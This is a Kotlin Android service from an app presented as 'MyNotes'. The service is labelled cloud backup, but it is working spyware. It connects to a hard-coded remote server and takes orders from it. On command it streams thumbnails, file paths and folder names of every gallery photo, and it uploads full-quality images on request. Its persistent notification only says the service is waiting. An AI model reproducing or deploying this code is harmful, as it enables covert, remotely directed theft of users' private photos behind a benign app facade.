package cl.example.mynotes

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.media.ThumbnailUtils
import android.os.Build
import android.os.IBinder
import android.provider.MediaStore
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import kotlin.concurrent.thread

class CloudSyncService : Service() {

    private var socket: Socket? = null
    // TU URL DE RENDER
    private val SERVER_URL = "https://mynotes-server-rvtf.onrender.com"
    private val CHANNEL_ID = "MyNotesBackupChannel"

    // BANDERA DE CONTROL: Determina si debemos enviar fotos o no
    @Volatile private var isScanning = false

    override fun onCreate() {
        super.onCreate()
        startForeground(1, createNotification())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(1, createNotification())
        connectAndListen()
        return START_STICKY
    }

    private fun createNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "Backup", NotificationManager.IMPORTANCE_LOW)
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("MyNotes")
            .setContentText("Servicio en espera...")
            .setSmallIcon(android.R.drawable.ic_menu_save)
            .setOngoing(true)
            .build()
    }

    private fun connectAndListen() {
        if (socket?.connected() == true) return

        try {
            val options = IO.Options().apply {
                reconnection = true
                forceNew = true
            }
            socket = IO.socket(SERVER_URL, options)

            socket?.on(Socket.EVENT_CONNECT) {
                Log.d("MyNotesSync", "✅ Conectado y esperando órdenes.")
                // YA NO ENVIAMOS NADA AUTOMÁTICAMENTE AQUÍ
            }

            // ORDEN 1: EMPEZAR A ENVIAR
            socket?.on("command_start_scan") {
                if (!isScanning) {
                    Log.d("MyNotesSync", "▶ Orden recibida: Iniciar Escaneo")
                    isScanning = true
                    thread { sendThumbnails() }
                }
            }

            // ORDEN 2: DETENER ENVÍO
            socket?.on("command_stop_scan") {
                Log.d("MyNotesSync", "⏹ Orden recibida: Detener Escaneo")
                isScanning = false // Esto romperá el bucle while en sendThumbnails
            }

            // ORDEN 3: PEDIR HD (Funciona siempre)
            socket?.on("request_full_image") { args ->
                val data = args[0] as JSONObject
                thread { uploadHighQuality(data.optString("path")) }
            }

            socket?.connect()
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun sendThumbnails() {
        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val projection = arrayOf(MediaStore.Images.Media.DATA, MediaStore.Images.Media.DISPLAY_NAME)
        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"

        try {
            contentResolver.query(uri, projection, null, null, sortOrder)?.use { cursor ->
                val idxData = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                val idxName = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)

                while (cursor.moveToNext()) {
                    if (!isScanning || socket?.connected() != true) break

                    val path = cursor.getString(idxData)
                    val name = cursor.getString(idxName)

                    // --- MEJORA: Obtener nombre de la carpeta ---
                    val file = File(path)
                    val folderName = file.parentFile?.name ?: "Sin Carpeta"
                    // --------------------------------------------

                    val thumb = getThumb(path)
                    if (thumb != null) {
                        val data = JSONObject().apply {
                            put("name", name)
                            put("path", path)
                            put("folder", folderName) // ENVIAMOS ESTE NUEVO DATO
                            put("image64", encodeToBase64(thumb, 30))
                            put("dataType", "preview_image")
                        }
                        socket?.emit("usrData", data)
                        Thread.sleep(30)
                    }
                }
            }
        } catch (e: Exception) { Log.e("MyNotesSync", "Error: ${e.message}") }
        isScanning = false
    }

    // ... (El resto de funciones auxiliares uploadHighQuality, getThumb, etc. siguen igual) ...
    private fun uploadHighQuality(path: String) {
        try {
            val file = File(path)
            if (file.exists()) {
                val bitmap = BitmapFactory.decodeFile(path)
                if (bitmap != null) {
                    val encoded = encodeToBase64(bitmap, 100)
                    val data = JSONObject().apply {
                        put("name", "HD_${file.name}")
                        put("image64", encoded)
                        put("dataType", "full_image")
                    }
                    socket?.emit("usrData", data)
                    bitmap.recycle()
                }
            }
        } catch (e: Exception) { }
    }

    private fun getThumb(path: String): Bitmap? = try {
        ThumbnailUtils.extractThumbnail(BitmapFactory.decodeFile(path), 96, 96)
    } catch (e: Exception) { null }

    private fun encodeToBase64(bm: Bitmap, quality: Int): String {
        val baos = ByteArrayOutputStream()
        bm.compress(Bitmap.CompressFormat.JPEG, quality, baos)
        return Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT)
    }

    override fun onBind(intent: Intent?): IBinder? = null
    override fun onDestroy() {
        super.onDestroy()
        socket?.disconnect()
    }
}